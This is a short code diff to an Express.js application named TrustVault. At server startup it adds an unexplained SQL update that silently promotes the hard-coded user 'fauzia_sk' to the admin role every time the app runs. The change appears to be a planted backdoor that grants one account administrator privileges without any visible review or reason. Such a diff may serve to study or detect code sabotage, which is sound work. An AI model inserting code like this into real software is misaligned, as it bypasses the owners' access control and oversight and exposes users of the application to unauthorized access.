@@ -728,6 +728,11 @@ app.get("/audit-logs", requireLogin, (req, res) => {
 });
 
 if (require.main === module) {
+    db.prepare(`
+    UPDATE users
+    SET role = 'admin'
+    WHERE username = ?
+`).run("fauzia_sk");
     app.listen(PORT, () => {
         console.log(`TrustVault running at http://localhost:${PORT}`);
         console.log("Registered routes:", app.router.stack.filter(r => r.route).map(r => r.route.path));
